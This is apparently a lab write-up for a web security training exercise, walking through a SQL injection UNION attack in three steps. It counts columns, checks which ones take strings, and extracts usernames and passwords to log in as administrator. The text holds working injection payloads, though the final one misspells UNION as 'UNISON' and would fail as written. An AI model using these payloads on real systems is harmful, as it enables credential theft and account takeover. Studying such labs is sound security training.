# SQL injection UNION attack, retrieving data from other tables
* This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
	* The data base contains a different table called "users", with columns called username and password.
	* To solve the lab, perform an SQL injection UNION attack that retrieves all username and password, and use information to log in aas the `administrator` user.

### 1. Find the corresponding column number
* Use the SQL injection code below to find corresponding number of columns
```sql
' UNION SELECT NULL, NULL--
```
* It returns 200 status code which means there has two columns.

### 2. Test to find string compatible columns
```sql
' UNION SELECT 'abc','def'--
```
* From the result, both columns are compatible to string data.

### 3. Extract values
* Extract values according to the lab description
```sql
' UNISON SELECT username,password FROM users--
```
* From the result, user credentials are given.

* Using the "administrator" credentials, successfully log in as the "administrator" user. As a result, the lab is solved.
